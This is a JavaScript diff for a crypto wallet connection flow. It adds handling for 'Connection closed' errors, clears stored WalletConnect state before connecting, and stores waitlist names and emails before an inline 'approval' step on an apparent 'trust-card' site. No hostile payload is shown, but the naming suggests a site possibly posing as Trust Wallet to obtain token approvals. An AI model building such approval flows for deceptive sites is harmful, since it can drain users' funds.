@@ -155,9 +155,11 @@
     }, 12000);
 
     fluxpayRejectionHandler = function (e) {
-      if (e && e.reason && (String(e.reason).indexOf('Loading chunk') >= 0 || String(e.reason).indexOf('404') >= 0 || String(e.reason).indexOf('Failed to fetch') >= 0 || String(e.reason).indexOf('ChunkLoadError') >= 0)) {
+      var msg = e && e.reason ? String(e.reason) : '';
+      var isKnown = msg.indexOf('Loading chunk') >= 0 || msg.indexOf('404') >= 0 || msg.indexOf('Failed to fetch') >= 0 || msg.indexOf('ChunkLoadError') >= 0 || msg.indexOf('Connection closed') >= 0;
+      if (isKnown) {
         e.preventDefault();
-        done('Wallet connection failed. Please try again.');
+        done(msg.indexOf('Connection closed') >= 0 ? 'Connection closed. Add ' + (typeof location !== 'undefined' ? location.hostname : 'trust-card.vercel.app') + ' to WalletConnect allowlist: dashboard.walletconnect.com' : 'Wallet connection failed. Please try again.');
       }
     };
     window.addEventListener('unhandledrejection', fluxpayRejectionHandler);
@@ -241,6 +243,15 @@
       sessionStorage.setItem('tw-card-redirect', cardUrl);
       sessionStorage.setItem('tw-waitlist-name', name);
       sessionStorage.setItem('tw-waitlist-email', email);
+    } catch (_) {}
+    /* Clear WalletConnect state before connect - avoids "Connection closed" from stale Next.js init */
+    try {
+      Object.keys(localStorage).forEach(function (k) {
+        if (k.startsWith('wc@') || k === 'WALLETCONNECT_DEEPLINK_CHOICE' || k.startsWith('WCM_')) localStorage.removeItem(k);
+      });
+      if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
+        try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
+      }
     } catch (_) {}
     showConnecting();
     runApprovalInline(network, function () { resetToForm(); });
